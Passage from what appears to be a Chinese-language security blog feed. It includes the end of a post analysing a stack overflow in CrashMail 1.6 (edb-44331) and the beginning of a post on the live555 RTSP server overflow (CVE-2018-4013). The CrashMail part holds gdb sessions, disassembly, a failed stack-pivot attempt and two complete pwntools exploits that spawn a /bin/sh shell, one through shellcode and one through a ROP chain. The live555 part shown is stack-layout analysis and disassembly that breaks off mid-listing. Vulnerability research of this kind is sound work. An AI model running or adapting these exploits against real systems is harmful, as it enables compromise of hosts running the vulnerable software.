<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail-rop.jpg" alt="crashmail-rop.jpg" /></p>

<h2 id="x64下的调试">x64下的调试</h2>

<p>x64下buf到栈上面保存的rbp的距离为0xd0，到返回地址的距离为0xd8</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text 00000000004038E6 <span class="p">;</span> bool __cdecl LockConfig<span class="o">(</span>char <span class="k">*</span>file<span class="o">)</span>
.text:00000000004038E6                 public LockConfig
.text:00000000004038E6 LockConfig      proc near               <span class="p">;</span> CODE XREF: main+1CB↓p
.text:00000000004038E6                                         <span class="p">;</span> main+24B↓p
.text:00000000004038E6
.text:00000000004038E6 file            <span class="o">=</span> qword ptr <span class="nt">-0D8h</span>
.text:00000000004038E6 buf             <span class="o">=</span> byte ptr <span class="nt">-0D0h</span>
.text:00000000004038E6 fp              <span class="o">=</span> qword ptr <span class="nt">-8</span>
.text:00000000004038E6
.text:00000000004038E6 <span class="p">;</span> __unwind <span class="o">{</span>
.text:00000000004038E6                 endbr64
.text:00000000004038EA                 push    rbp
.text:00000000004038EB                 mov     rbp, rsp
.text:00000000004038EE                 sub     rsp, 0E0h
.text:00000000004038F5                 mov     <span class="o">[</span>rbp+file], rdi
.text:00000000004038FC                 mov     rdx, <span class="o">[</span>rbp+file]
.text:0000000000403903                 lea     rax, <span class="o">[</span>rbp+buf]
.text:000000000040390A                 mov     rsi, rdx        <span class="p">;</span> src
.text:000000000040390D                 mov     rdi, rax        <span class="p">;</span> dest
.text:0000000000403910                 call    _strcpy
.text:0000000000403915                 lea     rax, <span class="o">[</span>rbp+buf]
</code></pre></div></div>

<p>把断点下在0x4039EE，LockConfig函数ret之前：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:00000000004039DC loc_4039DC:                             <span class="p">;</span> CODE XREF: LockConfig+D2↑j
.text:00000000004039DC                 mov     rax, <span class="o">[</span>rbp+fp]
.text:00000000004039E0                 mov     rdi, rax        <span class="p">;</span> os
.text:00000000004039E3                 call    osClose
.text:00000000004039E8                 mov     eax, 1
.text:00000000004039ED
.text:00000000004039ED locret_4039ED:                          <span class="p">;</span> CODE XREF: LockConfig+A0↑j
.text:00000000004039ED                                         <span class="p">;</span> LockConfig+F4↑j
.text:00000000004039ED                 leave
.text:00000000004039EE                 retn
.text:00000000004039EE <span class="p">;</span> <span class="o">}</span> // starts at 4038E6
.text:00000000004039EE LockConfig      endp
</code></pre></div></div>

<p>buf数组位于0x7ffe8bd42aa0 ，寄存器里除了rsp之外还有r13指向栈地址，但是r13指向的位置比rsp指针指向的位置高。由于存在NULL截断，所以就写不到这个位置。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint 1, 0x00000000004039ee <span class="k">in </span>LockConfig <span class="o">(</span><span class="nv">file</span><span class="o">=</span>0x7ffe8bd44797 <span class="s1">'\220'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>     │test@0c3259477029:/test<span class="nv">$ </span>
    at crashmail/crashmail.c:505                                                                       │test@0c3259477029:/test<span class="nv">$ </span>
505     <span class="o">}</span>                                                                                              │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls</span>                                                  │p_x64.py
<span class="o">(</span>gdb<span class="o">)</span> info reg                                                                                         │test@0c3259477029:/test<span class="nv">$ </span>./exp_x64.py 
rax            0x1                 1                                                                   │[+] Starting <span class="nb">local </span>process <span class="s1">'/usr/bin/gdbserver'</span>: pid 1212
rbx            0x42f950            4389200                                                             │[<span class="k">*</span><span class="o">]</span> running <span class="k">in </span>new terminal: <span class="o">[</span><span class="s1">'/usr/bin/gdb'</span>, <span class="s1">'-q'</span>, <span class="s1">'/test/crashmail-1.6/bin/crashmail'</span>, <span class="s1">'-x'</span>, <span class="s1">'/tmp/p
rcx            0x1                 1                                                                   │wnlib-gdbscript-m6dywxad.gdb'</span><span class="o">]</span>
rdx            0x0                 0                                                                   │[<span class="k">*</span><span class="o">]</span> Paused <span class="o">(</span>press any to <span class="k">continue</span><span class="o">)</span>
rsi            0x17e372a0          400781984                                                           │
rdi            0x17e37048          400781384                                                           │
rbp            0x9090909090909090  0x9090909090909090                                                  │
rsp            0x7ffe8bd42b78      0x7ffe8bd42b78                                                      │
r8             0x0                 0                                                                   │
r9             0x1                 1                                                                   │
r10            0x400b93            4197267                                                             │
r11            0x202               514                                                                 │
r12            0x402910            4204816                                                             │
r13            0x7ffe8bd42e90      140731244359312                                                     │
r14            0x0                 0                                                                   │
r15            0x0                 0                                                                   │
rip            0x4039ee            0x4039ee &lt;LockConfig+264&gt;                                           │
eflags         0x206               <span class="o">[</span> PF IF <span class="o">]</span>                                                           │
cs             0x33                51                                                                  │
ss             0x2b                43                                                                  │
ds             0x0                 0                                                                   │
es             0x0                 0                                                                   │
fs             0x0                 0                                                                   │
gs             0x0                 0                                                                   │
<span class="o">(</span>gdb<span class="o">)</span> p &amp;buf                                                                                           │
<span class="nv">$1</span> <span class="o">=</span> <span class="o">(</span>char <span class="o">(</span><span class="k">*</span><span class="o">)[</span>200]<span class="o">)</span> 0x7ffe8bd42aa0                                       
</code></pre></div></div>

<h3 id="栈劫持尝试">栈劫持尝试</h3>

<p>这种情况下我们尝试把栈劫持到buf[200]数组的范围内。</p>

<p>根据事实，x64程序的返回通常使用”leave ret“，以osExecute为例：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:000000000042F656 osExists        proc near               <span class="p">;</span> CODE XREF: LockConfig+AC↑p
.text:000000000042F656                 endbr64
.text:000000000042F65A                 push    rbp
.text:000000000042F65B                 mov     rbp, rsp
.text:000000000042F65E                 sub     rsp, 0A0h
.text:000000000042F665                 mov     <span class="o">[</span>rbp+file], rdi
.text:000000000042F66C                 lea     rdx, <span class="o">[</span>rbp+st]
.text:000000000042F673                 mov     rax, <span class="o">[</span>rbp+file]
.text:000000000042F67A                 mov     rsi, rdx        <span class="p">;</span> stat_buf
.text:000000000042F67D                 mov     rdi, rax        <span class="p">;</span> filename
.text:000000000042F680                 call    stat_0
.text:000000000042F685                 <span class="nb">test    </span>eax, eax
.text:000000000042F687                 jnz     short loc_42F690
.text:000000000042F689                 mov     eax, 1
.text:000000000042F68E                 jmp     short locret_42F695
.text:000000000042F690 loc_42F690:                             <span class="p">;</span> CODE XREF: osExists+31↑j
.text:000000000042F690                 mov     eax, 0
.text:000000000042F695
.text:000000000042F695 locret_42F695:                          <span class="p">;</span> CODE XREF: osExists+38↑j
.text:000000000042F695                 leave
.text:000000000042F696                 retn
.text:000000000042F696 osExists        endp
</code></pre></div></div>

<p>其中leave用于平衡栈，相当于指令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov rsp, rbp     <span class="p">;</span> 恢复rsp
pop rbp          <span class="p">;</span> 恢复父函数的rbp
</code></pre></div></div>

<p>当前函数返回的时候先用rbp寄存器恢复rsp指向save rbp，再从栈里面恢复父函数的rbp寄存器。</p>

<p>同理，当父函数返回的时候，同样也会调用leave指令，用rbp寄存器来恢复rsp，</p>

<p>而父函数使用的rbp寄存器，则由于子函数的栈溢出而被攻击者控制。</p>

<p>因此只要把栈上面保存的rbp覆盖为我们想要的值，那么当父函数返回的时候就会发生栈劫持。</p>

<p>攻击者可以在fake stack上面布置rop链，或者进行ret2shellcode攻击。</p>

<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail-%E5%8A%AB%E6%8C%81rsp.jpg" alt="crashmail-劫持rsp.jpg" /></p>

<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail-%E5%8A%AB%E6%8C%81rsp%201.jpg" alt="crashmail-劫持rsp.jpg" /></p>

<p>很不幸的是这个思路无法完成，存在以下4个无法解决的问题：</p>

<ul>
  <li>LockConfig函数的父函数是main，但是LockConfig返回到main函数后，main函数并不会马上结束，而是继续调用了其他函数，这就会导致我们在buf[200]上面布置好的jmp esp指令和shellcode会被破坏掉。因为我们只能控制栈上面的内容，但凡是可以往其他段上面写东西，就不存在这个问题了；</li>
  <li>通过NULL字节覆盖saved rbp的最低字节为0，还是没办法让rbp落在buf[200]数组中，因为main函数分配的栈空间很大，超过了0xFF，所以覆盖下来rbp还是指向main函数的栈空间；</li>
  <li>即使我们能够成功让rbp指向buf[200]数组，这也是随机事件，存在概率性，不可能每次都成功；</li>
  <li>当然最重要的，也无法解决的就是，即使我们把栈劫持到了buf[200]数组，我们还要提前把fake stack布置好吧，
    <ul>
      <li>如果是ret2shellcode，那么就要往里面模拟出fake rbp和“jmp esp”指令的地址。fake rbp好搞定，写0xdeadbeefdeadbeef就行了。指令地址就不行了，因为里面有\x00。</li>
      <li>如果是rop，那更完蛋，因为rop里面全是地址，完全写不了！</li>
    </ul>
  </li>
</ul>

<p>所以综上，栈劫持的思路也搞不定。</p>

<p>最后附上这次调试记录：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 第一次断在LockConfig函数的ret指令的位置, 查看buf[200]数组的地址为 0x7ffda2738a00 </span>
<span class="c"># 此时rbp寄存器已经被恢复为main函数的栈帧了</span>
<span class="c"># 到这个断点的时候，exp调试脚本已经把rbp寄存器手工设置为buf地址</span>
<span class="c"># 并且LockConfig的返回地址也修改为直接返回到main函数的leave ret指令处，不再调用其他函数直接退出</span>
<span class="c"># 在main函数的ret指令处下断点，观察栈劫持是否成功</span>

Reading /lib64/ld-linux-x86-64.so.2 from remote target...                                       │[<span class="k">*</span><span class="o">]</span> Process <span class="s1">'/usr/bin/gdbserver'</span> stopped with <span class="nb">exit </span>code 0 <span class="o">(</span>pid 1261<span class="o">)</span>
0x00007fd8d2981100 <span class="k">in </span>_start <span class="o">()</span> from target:/lib64/ld-linux-x86-64.so.2                         │test@0c3259477029:/test<span class="nv">$ </span>
Breakpoint 1 at 0x4039ee: file crashmail/crashmail.c, line 505.                                 │test@0c3259477029:/test<span class="nv">$ </span>
Reading /lib/x86_64-linux-gnu/libc.so.6 from remote target...                                   │test@0c3259477029:/test<span class="nv">$ </span>
                                                                                                │test@0c3259477029:/test<span class="nv">$ </span>./exp_x64.py 
Breakpoint 1, 0x00000000004039ee <span class="k">in </span>LockConfig <span class="o">(</span>                                                │[+] Starting <span class="nb">local </span>process <span class="s1">'/usr/bin/gdbserver'</span>: pid 1271
    <span class="nv">file</span><span class="o">=</span>0x7ffda273a7ad <span class="s1">'\220'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span> at crashmail/crashmail.c:505             │[<span class="k">*</span><span class="o">]</span> running <span class="k">in </span>new terminal: <span class="o">[</span><span class="s1">'/usr/bin/gdb'</span>, <span class="s1">'-q'</span>, <span class="s1">'/test/crashmail-1.6/bin/crashmail'</span>, <span class="s1">'-x'</span>, 
505     <span class="o">}</span>                                                                                       │<span class="s1">'/tmp/pwnlib-gdbscript-r447ypjw.gdb'</span><span class="o">]</span>
<span class="nv">$1</span> <span class="o">=</span> <span class="o">(</span>char <span class="o">(</span><span class="k">*</span><span class="o">)[</span>200]<span class="o">)</span> 0x7ffda2738a00                                                             │[<span class="k">*</span><span class="o">]</span> Paused <span class="o">(</span>press any to <span class="k">continue</span><span class="o">)</span>
Breakpoint 2 at 0x404188: file crashmail/crashmail.c, line 720.                                 │[<span class="k">*</span><span class="o">]</span> Process <span class="s1">'/usr/bin/gdbserver'</span> stopped with <span class="nb">exit </span>code 0 <span class="o">(</span>pid 1275<span class="o">)</span>
<span class="o">(</span>gdb<span class="o">)</span> p/x <span class="nv">$rbp</span>                                                                                  │test@0c3259477029:/test<span class="nv">$ </span>
<span class="nv">$2</span> <span class="o">=</span> 0x7ffda2738a00    

<span class="c"># 继续运行，在main函数的ret指令处断下</span>
<span class="c"># 观察此时rsp的值为0x7ffda2738a08，已经位于buf数组中</span>
<span class="c"># 证明可以使用leave ret进行栈劫持                                                                </span>
<span class="o">(</span>gdb<span class="o">)</span> c                                                                                         │test@0c3259477029:/test<span class="nv">$ </span>
Continuing.                                                                                     │test@0c3259477029:/test<span class="nv">$ </span>
                                                                                        │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls
</span>Breakpoint 2, 0x0000000000404188 <span class="k">in </span>main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>32728, <span class="nv">argv</span><span class="o">=</span>0x0<span class="o">)</span> at crashmail/crashmail.c:720    │ bin
720     <span class="o">}</span>                                                                                       │ container_start.sh
<span class="o">(</span>gdb<span class="o">)</span> p/x <span class="nv">$rsp</span>                                                                                  │ crashmail-1.6
<span class="nv">$3</span> <span class="o">=</span> 0x7ffda2738a08                                                                             │ crashmail-1.6.tar.gz
<span class="o">(</span>gdb<span class="o">)</span>                    

</code></pre></div></div>

<p>附上调试exp：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="c1"># shellcode版本
</span><span class="kn">from</span> <span class="n">subprocess</span> <span class="kn">import</span> <span class="n">run</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-hb</span><span class="sh">'</span><span class="p">]</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mh">0xd0</span>
<span class="n">offset</span> <span class="o">-=</span> <span class="nf">len</span><span class="p">(</span><span class="sh">'</span><span class="s">.busy</span><span class="sh">'</span><span class="p">)</span>
<span class="n">offset</span> <span class="o">-=</span> <span class="mi">1</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">script</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
    b *0x4039EE
    c
    p &amp;buf
    set $rbp=$1
    set *(unsigned long*)$rsp=0x404187
    b *0x404188
</span><span class="sh">'''</span>

<span class="c1"># run(["/test/crashmail-1.6/bin/crashmail", "SETTINGS", payload])
</span><span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">/test/crashmail-1.6/bin/crashmail</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">LOCK</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SETTINGS</span><span class="sh">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="sh">"</span><span class="s">UNLOCK</span><span class="sh">"</span><span class="p">],</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">,</span> <span class="n">exe</span><span class="o">=</span><span class="sh">"</span><span class="s">/test/crashmail-1.6/bin/crashmail</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>
</code></pre></div></div>

<h1 id="漏洞利用">漏洞利用</h1>

<h2 id="shellcode版本">shellcode版本</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="c1"># shellcode版本
</span><span class="kn">from</span> <span class="n">subprocess</span> <span class="kn">import</span> <span class="n">run</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">i386</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-hb</span><span class="sh">'</span><span class="p">]</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mh">0xd8</span>       <span class="c1"># buf数组到栈上面保存rbp的距离
</span><span class="n">xchg_eax_esi_ret</span> <span class="o">=</span> <span class="mh">0x80674ab</span>
<span class="n">jmp_eax</span> <span class="o">=</span> <span class="mh">0x8051807</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">xchg_eax_esi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p32</span><span class="p">(</span><span class="n">jmp_eax</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x300</span> <span class="o">+</span> <span class="n">shellcode</span>

<span class="nf">run</span><span class="p">([</span><span class="sh">"</span><span class="s">/test/crashmail-1.6/bin/crashmail</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SETTINGS</span><span class="sh">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">])</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/1.png" alt="1.png" /></p>

<h2 id="rop版本">rop版本</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>

<span class="c"># rop版本</span>
from subprocess import run
from pwn import <span class="k">*</span>

context.arch <span class="o">=</span> <span class="s1">'i386'</span>
context.os <span class="o">=</span> <span class="s1">'linux'</span>
context.terminal <span class="o">=</span> <span class="o">[</span><span class="s1">'tmux'</span>, <span class="s1">'splitw'</span>, <span class="s1">'-hb'</span><span class="o">]</span>

offset <span class="o">=</span> 0xd8       <span class="c"># buf数组到栈上面保存rbp的距离</span>
xchg_eax_esi_ret <span class="o">=</span> 0x80674ab
osExecute <span class="o">=</span> 0x80649CF     <span class="c"># push    eax; call    osExecute</span>

rw_seg <span class="o">=</span> 0x807d010

payload <span class="o">=</span> b<span class="s1">'\x90'</span> <span class="k">*</span> offset + p32<span class="o">(</span>xchg_eax_esi_ret<span class="o">)</span> + p32<span class="o">(</span>osExecute<span class="o">)</span> + <span class="se">\</span>
					b<span class="s1">'\x90'</span> <span class="k">*</span> 0x24c + b<span class="s1">'//bin/sh #'</span>

run<span class="o">([</span><span class="s2">"/test/crashmail-1.6/bin/crashmail"</span>, <span class="s2">"SETTINGS"</span>, payload]<span class="o">)</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-04-17_154222.png" alt="批注 2025-04-17 154222.png" /></p>]]></content><author><name></name></author><category term="userspace" /><summary type="html"><![CDATA[CrashMail 是一款早期的开源 DOS 系统下的 BBS 邮件处理工具。 漏洞编号：edb-44331 利用环境：ubuntu 20.04，源代码32位编译]]></summary></entry><entry><title type="html">live555栈溢出漏洞分析</title><link href="http://localhost:4000/userspace/2025/04/15/live555-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" rel="alternate" type="text/html" title="live555栈溢出漏洞分析" /><published>2025-04-15T13:27:38+08:00</published><updated>2025-04-15T13:27:38+08:00</updated><id>http://localhost:4000/userspace/2025/04/15/live555-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</id><content type="html" xml:base="http://localhost:4000/userspace/2025/04/15/live555-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"><![CDATA[<p>Live555 是一个开源的、跨平台的 C++ 库，主要用于实现 <strong>RTSP/RTP/RTCP</strong> 等流媒体协议的推流（Server）和拉流（Client）功能。它支持多种音视频格式（如 H.264、H.265、MP3、AAC 等），常用于 IP 摄像头、视频监控、直播等场景。</p>

<h1 id="漏洞信息">漏洞信息</h1>

<p>Live555 是一个开源的、跨平台的 C++ 库，主要用于实现 <strong>RTSP/RTP/RTCP</strong> 等流媒体协议的推流（Server）和拉流（Client）功能。它支持多种音视频格式（如 H.264、H.265、MP3、AAC 等），常用于 IP 摄像头、视频监控、直播等场景。</p>

<p>漏洞编号：cve-2018-4013</p>

<p>效果：攻击者可以获取远程shell</p>

<p>内存控制能力：</p>

<ul>
  <li>没有NULL截断，可随意写入</li>
  <li>栈上面的内容可控，无任何添加</li>
  <li>溢出长度可控</li>
  <li>没有内容过滤</li>
</ul>

<h1 id="漏洞分析">漏洞分析</h1>

<h2 id="调用关系">调用关系</h2>

<p><img src="/assets/posts/2025-04-15-live555栈溢出漏洞分析/live555.jpg" alt="live555.jpg" /></p>

<h2 id="漏洞原理">漏洞原理</h2>

<p>doEventLoop是处理网络输入的主逻辑，它是TaskScheduler对象的方法：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  
  <span class="n">TaskScheduler</span><span class="o">*</span> <span class="n">scheduler</span> <span class="o">=</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">createNew</span><span class="p">();</span>
  <span class="n">UsageEnvironment</span><span class="o">*</span> <span class="n">env</span> <span class="o">=</span> <span class="n">BasicUsageEnvironment</span><span class="o">::</span><span class="n">createNew</span><span class="p">(</span><span class="o">*</span><span class="n">scheduler</span><span class="p">);</span>
  <span class="p">......</span>
  <span class="n">env</span><span class="o">-&gt;</span><span class="n">taskScheduler</span><span class="p">().</span><span class="n">doEventLoop</span><span class="p">();</span> <span class="c1">// does not return</span>
<span class="p">}</span>
</code></pre></div></div>

<p>handleRequestBytes解析http请求的头部，把cookie部分保存在sessionCookie数组，accept部分保存在acceptStr数组中，两个数组长度都是200字节，其中acceptStr数组是溢出对象。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">RTSPServer</span><span class="o">::</span><span class="n">RTSPClientConnection</span><span class="o">::</span><span class="n">handleRequestBytes</span><span class="p">(</span><span class="kt">int</span> <span class="n">newBytesRead</span><span class="p">)</span> <span class="p">{</span>
	<span class="p">......</span>
	<span class="kt">char</span> <span class="n">sessionCookie</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">acceptStr</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>     <span class="c1">//溢出对象</span>
  <span class="o">*</span><span class="n">fLastCRLF</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> 
  <span class="n">parseSucceeded</span> <span class="o">=</span> <span class="n">parseHTTPRequestString</span><span class="p">(</span><span class="n">cmdName</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">cmdName</span><span class="p">,</span>
					      <span class="n">urlSuffix</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">urlPreSuffix</span><span class="p">,</span>
					      <span class="n">sessionCookie</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">sessionCookie</span><span class="p">,</span>
					      <span class="n">acceptStr</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">acceptStr</span><span class="p">);</span>
	<span class="p">......</span>
<span class="p">}</span>
</code></pre></div></div>

<p>可以看到acceptStr数组到返回地址的距离是0x1c8，因为这里的栈变量是以rsp+0x6D8来索引的，也就是用的到返回地址的距离：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:0000000000407EE0 _ZN10RTSPServer20RTSPClientConnection18handleRequestBytesEi proc near
.text:0000000000407EE0                                         <span class="p">;</span> DATA XREF: .data.rel.ro:0000000000464F68↓o
.text:0000000000407EE0
.text:0000000000407EE0 var_6D8         <span class="o">=</span> qword ptr <span class="nt">-6D8h</span>
.text:0000000000407EE0 tmpPtr          <span class="o">=</span> qword ptr <span class="nt">-6D0h</span>
.text:0000000000407EE0 var_6C8         <span class="o">=</span> qword ptr <span class="nt">-6C8h</span>
.text:0000000000407EE0 newBytesRead    <span class="o">=</span> qword ptr <span class="nt">-6C0h</span>
.text:0000000000407EE0 reuseConnection <span class="o">=</span> byte ptr <span class="nt">-6ADh</span>
.text:0000000000407EE0 contentLength   <span class="o">=</span> dword ptr <span class="nt">-6ACh</span>
.text:0000000000407EE0 cmdName         <span class="o">=</span> byte ptr <span class="nt">-6A8h</span>
.text:0000000000407EE0 urlPreSuffix    <span class="o">=</span> byte ptr <span class="nt">-5D8h</span>
.text:0000000000407EE0 urlSuffix       <span class="o">=</span> byte ptr <span class="nt">-508h</span>
.text:0000000000407EE0 cseq            <span class="o">=</span> byte ptr <span class="nt">-438h</span>
.text:0000000000407EE0 sessionIdStr    <span class="o">=</span> byte ptr <span class="nt">-368h</span>
.text:0000000000407EE0 sessionCookie   <span class="o">=</span> byte ptr <span class="nt">-298h</span>
.text:0000000000407EE0 acceptStr       <span class="o">=</span> byte ptr <span class="nt">-1C8h</span>     <span class="p">;</span> 到返回地址的距离为0x1c8
.text:0000000000407EE0
.text:0000000000407EE0 this <span class="o">=</span> rdi                              <span class="p">;</span> RTSPServer::RTSPClientConnection <span class="k">*</span>const
.text:0000000000407EE0 newBytesRead_0 <span class="o">=</span> rsi                    <span class="p">;</span> int
.text:0000000000407EE0 <span class="p">;</span> __unwind <span class="o">{</span>
.text:0000000000407EE0                 endbr64
.text:0000000000407EE4                 push    r15
.text:0000000000407EE6                 mov     r15, this
.text:0000000000407EE9                 push    r14
.text:0000000000407EEB                 push    r13
.text:0000000000407EED                 mov     r13d, esi
.text:0000000000407EF0                 push    r12
.text:0000000000407EF2                 push    rbp
.text:0000000000407EF3                 push    rbx
.text:0000000000407EF4                 sub     rsp, 6A8h
.text:0000000000407EFB                 add     dword ptr <span class="o">[</span>this+9C90h], 1
.text:0000000000407F02                 mov     r9d, <span class="o">[</span>this+9C68h]
.text:0000000000407F09                 <span class="nb">test    </span>esi, esi
.text:0000000000407F0B                 js      loc_4082C6
.text:0000000000407F11                 xor     eax, eax
.text:0000000000407F13 numBytesRemaining <span class="o">=</span> rax                 <span class="p">;</span> int
.text:0000000000407F13                 mov     r12d, r13d
.text:0000000000407F16                 cmp     r13d, r9d
.text:0000000000407F19                 jnb     loc_4082C6
.text:0000000000407F1F this <span class="o">=</span> r15                              <span class="p">;</span> RTSPServer::RTSPClientConnection <span class="k">*</span>const
.text:0000000000407F1F newBytesRead_0 <span class="o">=</span> r12                    <span class="p">;</span> int
.text:0000000000407F1F                 nop
.text:0000000000407F20
.text:0000000000407F20 loc_407F20:                             <span class="p">;</span> CODE XREF: RTSPServer::RTSPClientConnection::handleRequestBytes<span class="o">(</span>int<span class="o">)</span>+3E0↓j
.text:0000000000407F20                 mov     edx, <span class="o">[</span>this+9C64h]
.text:0000000000407F27                 lea     rbx, <span class="o">[</span>this+rdx+24h]
.text:0000000000407F2C ptr <span class="o">=</span> rbx                               <span class="p">;</span> unsigned __int8 <span class="k">*</span>
.text:0000000000407F2C                 movsxd  rdx, r13d
.text:0000000000407F2F                 mov     byte ptr <span class="o">[</span>ptr+rdx], 0
.text:0000000000407F33                 <span class="nb">test    </span>eax, eax
.text:0000000000407F35                 jz      loc_408318
.text:0000000000407F3B                 sub     rsp, 8
.text:0000000000407F3F                 mov     rdi, cs:stderr@@GLIBC_2_2_5
.text:0000000000407F46                 mov     r9d, r13d
.text:0000000000407F49                 xor     eax, eax
.text:0000000000407F4B                 push    ptr
.text:0000000000407F4C                 lea     rdx, aRtspclientconn <span class="p">;</span> <span class="s2">"RTSPClientConnection[%p]::handleRequest"</span>...
.text:0000000000407F53                 mov     rcx, this
.text:0000000000407F56                 mov     esi, 1
.text:0000000000407F5B                 lea     r8, aProcessing <span class="p">;</span> <span class="s2">"processing"</span>
.text:0000000000407F62                 call    ___fprintf_chk
.text:0000000000407F67                 mov     r9d, <span class="o">[</span>this+9CD8h]
.text:0000000000407F6E                 pop     rax
.text:0000000000407F6F                 pop     rdx
.text:0000000000407F70
.text:0000000000407F70 loc_407F70:                             <span class="p">;</span> CODE XREF: RTSPServer::RTSPClientConnection::handleRequestBytes<span class="o">(</span>int<span class="o">)</span>+482↓j
.text:0000000000407F70                                         <span class="p">;</span> RTSPServer::RTSPClientConnection::handleRequestBytes<span class="o">(</span>int<span class="o">)</span>+6B8↓j
.text:0000000000407F70                 <span class="nb">test    </span>r9d, r9d
.text:0000000000407F73                 jnz     short loc_407FE0
.text:0000000000407F75                 mov     rax, <span class="o">[</span>this+9C88h]
.text:0000000000407F7C                 lea     rbp, <span class="o">[</span>this+24h]
.text:0000000000407F80                 lea     r11, <span class="o">[</span>rax+2]
.text:0000000000407F84                 movsxd  rax, r13d
.text:0000000000407F87                 cmp     rbp, r11
